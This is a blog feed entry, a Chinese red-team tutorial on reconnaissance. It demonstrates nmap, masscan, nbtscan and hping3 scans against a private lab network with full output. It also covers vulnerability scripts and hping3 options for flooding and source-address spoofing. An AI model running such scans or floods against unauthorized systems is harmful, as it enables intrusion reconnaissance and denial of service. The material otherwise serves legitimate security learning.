<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A1andNS - Home for A1andNS</title>
  
  <subtitle>For the study</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-11-04T04:34:33.661Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>A1andNS</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>红队笔记之信息收集</title>
    <link href="http://yoursite.com/post/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>http://yoursite.com/post/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</id>
    <published>2021-11-02T11:03:33.000Z</published>
    <updated>2021-11-04T04:34:33.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透测试第一步，就是信息收集。信息收集很大程度为后续工作打下基础。针对目标资产和主机进行信息收集是必不可少的的部分，也是至关重要的部分。</p><h1 id="Nmap篇"><a href="#Nmap篇" class="headerlink" title="Nmap篇"></a>Nmap篇</h1><p>nmap是最常用的一个主机扫描工具，也为大家所熟知。你可以在这里Nmap官网：<a href="https://nmap.org/%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8apt%E5%91%BD%E4%BB%A4%E7%9B%B4%E6%8E%A5%E5%AE%89%E8%A3%85%EF%BC%88Debian%E7%B3%BB%E5%88%97%E7%9A%84Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%EF%BC%89%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5man%E4%B8%80%E4%B8%8B%E6%9F%A5%E7%9C%8B%EF%BC%8Cnmap%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%B0%E5%AF%8C%E7%9A%84%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%BC%8F%EF%BC%8C%E4%B9%9F%E6%98%AF%E6%B6%B5%E7%9B%96%E4%BA%86%E6%88%91%E4%BB%AC%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%A2%E6%B5%8B%E6%96%B9%E5%BC%8F%E4%BA%86%EF%BC%9A">https://nmap.org/下载，也可以使用apt命令直接安装（Debian系列的Linux环境下），使用方法我们可以man一下查看，nmap提供了丰富的扫描模式，也是涵盖了我们常用的探测方式了：</a></p><p><strong>看法：适合用于内网主机存活（系统）探测、主机端口（服务、版本）探测、常见漏洞检测</strong></p><h2 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h2><p>扫描流程如下：</p><ol><li><p>发送SYN  </p></li><li><p>回复ACK则是LISTEN，回复RST则CLOSED </p></li><li><p>回复ACK</p></li></ol><p>扫描参数：<strong>nmap -sT</strong></p><p>特点：TCP连接，容易被察觉和留下痕迹</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sT 192.168.133.132Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 07:24 EDTNmap scan report for 192.168.133.132Host is up (0.0019s latency).Not shown: 992 filtered portsPORT     STATE SERVICE25&#x2F;tcp   open  smtp110&#x2F;tcp  open  pop3135&#x2F;tcp  open  msrpc139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds902&#x2F;tcp  open  iss-realsecure912&#x2F;tcp  open  apex-mesh5357&#x2F;tcp open  wsdapiNmap done: 1 IP address (1 host up) scanned in 9.72 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SYN半开连接"><a href="#SYN半开连接" class="headerlink" title="SYN半开连接"></a>SYN半开连接</h2><p>扫描流程：</p><ol><li>发送SYN</li><li>回复ACK+SYN 则LISTEN，回复RST 则CLOSED，不回复则过滤了</li><li>发送RST断开连接</li></ol><p>扫描参数：<strong>nmap -sS</strong></p><p>特点：应用程序没有日志、行踪隐蔽</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#要求使用root权限扫描┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sS 192.168.133.132  Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 07:23 EDTNmap scan report for 192.168.133.132Host is up (0.0027s latency).Not shown: 992 filtered portsPORT     STATE SERVICE25&#x2F;tcp   open  smtp110&#x2F;tcp  open  pop3135&#x2F;tcp  open  msrpc139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds902&#x2F;tcp  open  iss-realsecure912&#x2F;tcp  open  apex-mesh5357&#x2F;tcp open  wsdapiNmap done: 1 IP address (1 host up) scanned in 5.28 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>感觉SYN比TCP是更好的，他可以有效隐蔽自己，但是需要root权限，只有root权限在自己手中方可进行。</p><h2 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h2><p>扫描流程：</p><ol><li><p>发送ACK</p></li><li><p>接收RST包TTL小于64开启，大于64关闭</p></li></ol><p>扫描参数：<strong>nmap -sA</strong></p><p>特点：速度很快，效果欠佳</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sA 192.168.133.132Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 07:35 EDTNmap scan report for 192.168.133.132Host is up (0.000056s latency).All 1000 scanned ports on 192.168.133.132 are unfilteredNmap done: 1 IP address (1 host up) scanned in 0.36 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>扫描流程：</p><ol><li><p>发送UDP包</p></li><li><p>返回ICMP_PORT_UNREACH为关闭，否则打开</p></li></ol><p>扫描参数：nmap -sU</p><p>特点：速度慢、无连接不可靠、对方有可能会禁用UDP</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sU 192.168.133.132Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 07:37 EDTNmap scan report for 192.168.133.132Host is up (0.00068s latency).All 1000 scanned ports on 192.168.133.132 are open|filteredNmap done: 1 IP address (1 host up) scanned in 22.17 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常用的扫描组合"><a href="#常用的扫描组合" class="headerlink" title="常用的扫描组合"></a>常用的扫描组合</h2><h3 id="扫描1-10000的端口、详细信息（操作系统、版本…）"><a href="#扫描1-10000的端口、详细信息（操作系统、版本…）" class="headerlink" title="扫描1-10000的端口、详细信息（操作系统、版本…）"></a>扫描1-10000的端口、详细信息（操作系统、版本…）</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nmap -T4 -A 目标# -T&lt;0-5&gt;是时间模板，数字越大，速度越快# -A是详细信息┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -T4 -A  192.168.133.132Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 07:46 EDTNmap scan report for 192.168.133.132Host is up (0.0014s latency).Not shown: 993 filtered portsPORT    STATE SERVICE         VERSION25&#x2F;tcp  open  tcpwrapped|_smtp-commands: Couldn&#39;t establish connection on port 25110&#x2F;tcp open  tcpwrapped135&#x2F;tcp open  msrpc           Microsoft Windows RPC139&#x2F;tcp open  netbios-ssn     Microsoft Windows netbios-ssn445&#x2F;tcp open  microsoft-ds?902&#x2F;tcp open  ssl&#x2F;vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)912&#x2F;tcp open  vmware-auth     VMware Authentication Daemon 1.0 (Uses VNC, SOAP)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Microsoft Windows XP|7|2012OS CPE: cpe:&#x2F;o:microsoft:windows_xp::sp3 cpe:&#x2F;o:microsoft:windows_7 cpe:&#x2F;o:microsoft:windows_server_2012OS details: Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012Network Distance: 2 hopsService Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:|_clock-skew: -1s| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-11-02T11:46:33|_  start_date: N&#x2F;ATRACEROUTE (using port 25&#x2F;tcp)HOP RTT     ADDRESS1   1.52 ms 192.168.133.22   1.54 ms 192.168.133.132OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 43.43 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到-A扫描是一次很全面的查询，一次查询多个项目。</p><h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nmap -sV 目标# 正如选项所写scan Version# 用于探测端口服务的版本，但是速度很慢┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sV  192.168.133.132Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 08:23 EDTNmap scan report for 192.168.133.132Host is up (0.0013s latency).Not shown: 992 filtered portsPORT     STATE SERVICE         VERSION25&#x2F;tcp   open  tcpwrapped110&#x2F;tcp  open  tcpwrapped135&#x2F;tcp  open  msrpc           Microsoft Windows RPC139&#x2F;tcp  open  netbios-ssn     Microsoft Windows netbios-ssn445&#x2F;tcp  open  microsoft-ds?902&#x2F;tcp  open  ssl&#x2F;vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)912&#x2F;tcp  open  vmware-auth     VMware Authentication Daemon 1.0 (Uses VNC, SOAP)5357&#x2F;tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># sudo nmap -O 目标# 要求root权限运行# 检查目标主机操作系统，但是很多时候只能判断大体系统为windows&#x2F;unix&#x2F;linux，很难确认到底是什么版本仅供参考的。┌──(kali㉿kali)-[~]└─$ sudo nmap -O 192.168.133.132                                         [sudo] password for kali: Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 08:30 EDTNmap scan report for 192.168.133.132Host is up (0.0024s latency).Not shown: 992 filtered portsPORT     STATE SERVICE25&#x2F;tcp   open  smtp110&#x2F;tcp  open  pop3135&#x2F;tcp  open  msrpc139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds902&#x2F;tcp  open  iss-realsecure912&#x2F;tcp  open  apex-mesh5357&#x2F;tcp open  wsdapiWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAP|phoneRunning: Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:&#x2F;o:linux:linux_kernel:2.4.20 cpe:&#x2F;o:linux:linux_kernel:2.6.22 cpe:&#x2F;h:sonyericsson:u8i_vivazOS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneOS detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds                                                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫描内网主机存活"><a href="#扫描内网主机存活" class="headerlink" title="扫描内网主机存活"></a>扫描内网主机存活</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nmap -sP 目标# 用来查看内网存活的主机┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sP  192.168.133.0&#x2F;24                                                                         Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-02 08:42 EDTNmap scan report for 192.168.133.1Host is up (0.00044s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.133.2Host is up (0.00038s latency).MAC Address: 00:50:56:EE:98:ED (VMware)Nmap scan report for 192.168.133.254Host is up (0.00023s latency).MAC Address: 00:50:56:FE:F9:62 (VMware)Nmap scan report for 192.168.133.132Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 28.19 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫描常见的漏洞"><a href="#扫描常见的漏洞" class="headerlink" title="扫描常见的漏洞"></a>扫描常见的漏洞</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nmap --script vuln 目标# --script选项还可以选很多其他lua脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="masscan篇"><a href="#masscan篇" class="headerlink" title="masscan篇"></a>masscan篇</h1><p>第一次听说masscan实在一次CTF的理论赛环节，Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。不过这个工具给我的感觉确实比nmap要快。</p><p>masscan为kali自带的。也可以自行安装。</p><p><strong>看法：适合用于主机端口扫描</strong></p><p>masscan这个工具主要有以下常用之方法：</p><h2 id="单端口扫描"><a href="#单端口扫描" class="headerlink" title="单端口扫描"></a>单端口扫描</h2><p>扫描参数：<strong>masscan 目标 -p端口号</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo masscan 192.168.133.132 -p445                                                                                                                                                                     Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2021-11-03 09:09:08 GMTInitiating SYN Stealth ScanScanning 1 hosts [1 port&#x2F;host]Discovered open port 445&#x2F;tcp on 192.168.133.132                                                                                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多端口扫描"><a href="#多端口扫描" class="headerlink" title="多端口扫描"></a>多端口扫描</h2><p>扫描参数：</p><ol><li><strong>masscan 目标 -p端口1,端口2</strong></li><li><strong>masscan 目标 -p端口1-端口2</strong></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo masscan 192.168.133.132 -p445,80,443,135                                                                                                                                                              Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2021-11-03 09:14:54 GMTInitiating SYN Stealth ScanScanning 1 hosts [4 ports&#x2F;host]Discovered open port 445&#x2F;tcp on 192.168.133.132                                 Discovered open port 135&#x2F;tcp on 192.168.133.132  ┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo masscan 192.168.133.132 -p1-1000                                                                                                                                                                       Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2021-11-03 09:19:30 GMTInitiating SYN Stealth ScanScanning 1 hosts [1000 ports&#x2F;host]Discovered open port 135&#x2F;tcp on 192.168.133.132                                  Discovered open port 139&#x2F;tcp on 192.168.133.132                            Discovered open port 25&#x2F;tcp on 192.168.133.132                       Discovered open port 912&#x2F;tcp on 192.168.133.132                           Discovered open port 110&#x2F;tcp on 192.168.133.132                              Discovered open port 902&#x2F;tcp on 192.168.133.132                              Discovered open port 445&#x2F;tcp on 192.168.133.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫描一个网段的所有端口"><a href="#扫描一个网段的所有端口" class="headerlink" title="扫描一个网段的所有端口"></a>扫描一个网段的所有端口</h2><p>扫描参数：<strong>masscan 目标/24 –rate 100000</strong></p><p>-rate参数用于调节每秒发送的数据包个数，在masscan中默认速度为100个/s，这显然是很慢的,这里我是采用了100000个/s，但是要注意一个点，这里的rate需要适当，对方信息系统的承受能力我们无法清楚了解，如果我们的rate过高了，很有可能就会对其造成DOS攻击了。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo masscan 192.168.133.132&#x2F;24 -p0-65535 --rate 100000                                                                                                                                               Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2021-11-03 09:27:19 GMTInitiating SYN Stealth ScanScanning 256 hosts [65536 ports&#x2F;host]Discovered open port 53&#x2F;tcp on 192.168.133.2   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h1><p>互联网搜索引擎nbtscan是一个扫描WINDOWS网络NetBIOS信息的小工具，2005年11月23日发布。NBTSCAN身材娇小，简单快速。但只能用于局域网，可以显示IP，主机名，用户名称和MAC地址等等。</p><pre class="line-numbers language-none"><code class="language-none"># github项目主页https:&#x2F;&#x2F;github.com&#x2F;search?q&#x3D;nbtscan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>看法：适合用于内网/局域网主机发现</strong></p><p>该工具已经由kali Linux自带了，常见的扫描方式有一下的几种：</p><h2 id="扫描整个C段"><a href="#扫描整个C段" class="headerlink" title="扫描整个C段"></a>扫描整个C段</h2><p>扫描参数：<strong>nbtscan -r 目标/24</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nbtscan -r 192.168.133.0&#x2F;24                                                                                                                                                                            Doing NBT name scan for addresses from 192.168.133.0&#x2F;24IP address       NetBIOS Name     Server    User             MAC address      ------------------------------------------------------------------------------192.168.133.13     LAPTOP-99206HMC  &lt;server&gt;  &lt;unknown&gt;        00:2b:67:2c:13:8e192.168.133.115    DESKTOP-S9A091T  &lt;server&gt;  &lt;unknown&gt;        b0:7b:25:3e:6b:68<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫描一个范围"><a href="#扫描一个范围" class="headerlink" title="扫描一个范围"></a>扫描一个范围</h2><p>扫描参数：<strong>nbtscan 目标（起始）-目标（结尾）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nbtscan 192.168.133.0-100                                                                                                                                                                         130 ⨯ 2 ⚙[sudo] password for kali: Doing NBT name scan for addresses from 192.168.133.0-100IP address       NetBIOS Name     Server    User             MAC address      ------------------------------------------------------------------------------192.168.133.13     LAPTOP-99206HMC  &lt;server&gt;  &lt;unknown&gt;        00:2b:67:2c:13:8e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="以符号分割显示结果"><a href="#以符号分割显示结果" class="headerlink" title="以符号分割显示结果"></a>以符号分割显示结果</h2><p>扫描参数：<strong>nbtscan -v -s  符号 目标</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nbtscan -v -s : 192.168.133.0&#x2F;24                                                                                                                                                                             2 ⚙192.168.133.13:LAPTOP-99206HMC:00U192.168.133.13:WORKGROUP      :00G192.168.133.13:LAPTOP-99206HMC:20U192.168.133.13:MAC:00:2b:67:2c:13:8e192.168.133.115:DESKTOP-S9A091T:00U192.168.133.115:WORKGROUP      :00G192.168.133.115:DESKTOP-S9A091T:20U192.168.133.115:MAC:b0:7b:25:3e:6b:68192.168.133.118:LAPTOP-ONIVL0MA:20U192.168.133.118:WORKGROUP      :00G192.168.133.118:LAPTOP-ONIVL0MA:00U192.168.133.118:MAC:00:e0:4c:36:17:4b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫描文件里的目标范围"><a href="#扫描文件里的目标范围" class="headerlink" title="扫描文件里的目标范围"></a>扫描文件里的目标范围</h2><p>扫描参数：<strong>nbtscan -f 文件名</strong></p><p>在文件中写入一个ip字典，使用-f参数可以导入ip字典中的ip进行探测，和其他工具引用字典原理一样。</p><h1 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h1><p>hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。</p><p>download link：<a href="http://www.hping.org/download.html">http://www.hping.org/download.html</a></p><p><strong>看法：适合用于DOS、路由跟踪、ICMP网络测试、主机端口扫描</strong></p><p>About Hping3 usage，you can <code>man hping3</code></p><pre class="line-numbers language-none"><code class="language-none">用法: hping3 host [options]  -h  --help      显示帮助  -v  --version   显示版本  -c  --count     发送数据包的数目  -i  --interval  发送数据包间隔的时间 (uX即X微秒, 例如：-i u1000)      --fast      等同 -i u10000 (每秒10个包)      --faster    等同 -i u1000 (每秒100个包)      --flood    尽最快发送数据包，不显示回复。  -n  --numeric   数字化输出，象征性输出主机地址。  -q  --quiet     安静模式  -I  --interface 网卡接口 (默认路由接口)  -V  --verbose   详细模式  -D  --debug     调试信息  -z  --bind      绑定ctrl+z到ttl(默认为目的端口)  -Z  --unbind    取消绑定ctrl+z键      --beep      对于接收到的每个匹配数据包蜂鸣声提示模式选择  default mode     TCP   &#x2F;&#x2F; 默认模式是 TCP  -0  --rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。  -1  --icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型&#x2F;模式的ICMP报文。  -2  --udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。  -8  --scan       SCAN mode. &#x2F;&#x2F;扫描模式 指定扫描对应的端口。                   Example: hping --scan 1-30,70-90 -S www.target.host    &#x2F;&#x2F; 扫描  -9  --listen     listen mode  &#x2F;&#x2F; 监听模式  IP 模式  -a  --spoof      spoof source address  &#x2F;&#x2F;源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。  --rand-dest      random destionation address mode. see the man. &#x2F;&#x2F; 随机目的地址模式。详细使用 man 命令  --rand-source    random source address mode. see the man.       &#x2F;&#x2F; 随机源地址模式。详细使用 man 命令  -t  --ttl        ttl (默认 64)  &#x2F;&#x2F;修改 ttl 值  -N  --id         id (默认 随机)  &#x2F;&#x2F; hping 中的 ID 值，缺省为随机值  -W  --winid      使用win* id字节顺序  &#x2F;&#x2F;使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。  -r  --rel        相对id字段(估计主机流量)  &#x2F;&#x2F;更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。  -f  --frag       拆分数据包更多的frag.  (may pass weak acl)   &#x2F;&#x2F;分段，可以测试对方或者交换机碎片处理能力，缺省16字节。  -x  --morefrag   设置更多的分段标志    &#x2F;&#x2F; 大量碎片，泪滴攻击。  -y  --dontfrag   设置不分段标志    &#x2F;&#x2F; 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。  -g  --fragoff    set the fragment offset    &#x2F;&#x2F; 设置断偏移。  -m  --mtu        设置虚拟最大传输单元, implies --frag if packet size &gt; mtu    &#x2F;&#x2F; 设置虚拟MTU值，当大于mtu的时候分段。  -o  --tos        type of service (default 0x00), try --tos help          &#x2F;&#x2F; tos字段，缺省0x00，尽力而为？  -G  --rroute     includes RECORD_ROUTE option and display the route buffer    &#x2F;&#x2F; 记录IP路由，并显示路由缓冲。  --lsrr           松散源路由并记录路由        &#x2F;&#x2F; 松散源路由  --ssrr           严格源路由并记录路由      &#x2F;&#x2F; 严格源路由  -H  --ipproto    设置IP协议字段，仅在RAW IP模式下使用   &#x2F;&#x2F;在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。ICMP 模式  -C  --icmptype   icmp类型(默认echo请求)    &#x2F;&#x2F; ICMP类型，缺省回显请求。  -K  --icmpcode   icmp代号(默认0)     &#x2F;&#x2F; ICMP代码。      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)    &#x2F;&#x2F; 强制ICMP类型。      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    &#x2F;&#x2F; ICMP重定向      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            &#x2F;&#x2F; icmp时间戳      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  &#x2F;&#x2F; icmp子网地址      --icmp-help  显示其他icmp选项帮助      &#x2F;&#x2F; ICMP帮助UDP&#x2F;TCP 模式  -s  --baseport   base source port             (default random)              &#x2F;&#x2F; 缺省随机源端口  -p  --destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc&#x2F;dec    &#x2F;&#x2F; 缺省随机源端口  -k  --keep       keep still source port      &#x2F;&#x2F; 保持源端口  -w  --win        winsize (default 64)        &#x2F;&#x2F; win的滑动窗口。windows发送字节(默认64)  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen &#x2F; 4)    &#x2F;&#x2F; 设置伪造tcp数据偏移量(取代tcp地址长度除4)  -Q  --seqnum     shows only tcp sequence number        &#x2F;&#x2F; 仅显示tcp序列号  -b  --badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP&#x2F;TCP校验和。  -M  --setseq     设置TCP序列号   -L  --setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)  -F  --fin        set FIN flag  -S  --syn        set SYN flag  -R  --rst        set RST flag  -P  --push       set PUSH flag  -A  --ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）  -U  --urg        set URG flag      &#x2F;&#x2F; 一大堆IP抱头的设置。  -X  --xmas       set X unused flag (0x40)  -Y  --ymas       set Y unused flag (0x80)  --tcpexitcode    使用last tcp-&gt; th_flags作为退出码  --tcp-mss        启用具有给定值的TCP MSS选项  --tcp-timestamp  启用TCP时间戳选项来猜测HZ&#x2F;uptimeCommon &#x2F;&#x2F;通用设置  -d  --data       data size    (default is 0)    &#x2F;&#x2F; 发送数据包大小，缺省是0。  -E  --file       文件数据  -e  --sign       添加“签名”  -j  --dump       转储为十六进制数据包  -J  --print      转储为可打印字符  -B  --safe       启用“安全”协议  -u  --end        告诉你什么时候--file达到EOF并防止倒回  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳  --tr-no-rtt     不要在跟踪路由模式下计算&#x2F;显示RTT信息 ARS包描述（新增功能，不稳定）ARS packet description (new, unstable)  --apd-send       发送APD描述数据包(参见docs &#x2F; APD.txt)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s